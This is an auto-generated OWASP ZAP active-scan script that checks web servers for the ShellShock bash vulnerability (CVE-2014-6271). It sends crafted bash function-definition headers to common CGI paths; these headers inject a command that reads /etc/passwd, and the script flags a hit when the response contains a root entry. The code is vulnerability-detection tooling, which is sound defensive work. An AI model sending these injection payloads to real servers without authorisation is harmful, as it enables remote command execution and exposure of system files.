/*
 * MIT License
 *
 * Copyright (c) 2022 Sepehrdad
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

// auto generated by nuclei2zap
var RISK = 3 // 0: info, 1: low, 2: medium, 3: high
var CONFIDENCE = 3 // 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
var TITLE = "[CVE-2014-6271] ShellShock - Remote Code Execution"
var DESCRIPTION = "GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock."
var SOLUTION = "Apply all relevant security patches and product upgrades."
var REFERENCE = "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"
var OTHER = "see: https://www.cvedetails.com/cve/CVE-2014-6271"

function log(msg) {
	print("[" + this["zap.script.name"] + "] " + msg);
}

function alert(as, msg, evidence) {
	as.newAlert()
		.setRisk(RISK)
		.setConfidence(CONFIDENCE)
		.setName(TITLE)
		.setDescription(DESCRIPTION)
		.setEvidence(evidence)
		.setOtherInfo(OTHER)
		.setSolution(SOLUTION)
		.setReference(REFERENCE)
		.setMessage(msg)
		.raise();
}

function scanNode(as, msg) {

	var uri = msg.getRequestHeader().getURI();

	if (uri.getPath() != null && uri.getPath().length() > 1) {
		log("ignoring scan for " + uri);
		return;
	}

	log("scanning " + uri);

	var paths = {
		"/cgi-bin/status": null,
		"/cgi-bin/stats": null,
		"/cgi-bin/test": null,
		"/cgi-bin/status/status.cgi": null,
		"/test.cgi": null,
		"/debug.cgi": null,
		"/cgi-bin/test-cgi": null,
	}

	var headers = {
		"Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
		"Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
		"Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
	}

	for (var path in paths) {

		// Copy requests before reusing them
		msg = msg.cloneRequest();

		var request_header = msg.getRequestHeader();
		uri = request_header.getURI();
		uri.setPath(path);

		for (var header in headers) {
			request_header.setHeader(header, headers[header]);
		}

		// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
		as.sendAndReceive(msg, false, false);

		var response_header = msg.getResponseHeader();
		var response_body = msg.getResponseBody();

		var re = new RegExp("root:.*:0:0:", 'g');

		var evidence = response_body.toString().match(re);

		// Test the response here, and make other requests as required
		if (response_header.getStatusCode() == 200 && evidence) {
			alert(as, msg, evidence);
		}
	}

}

function scan(as, msg, param, value) {
	return;
}
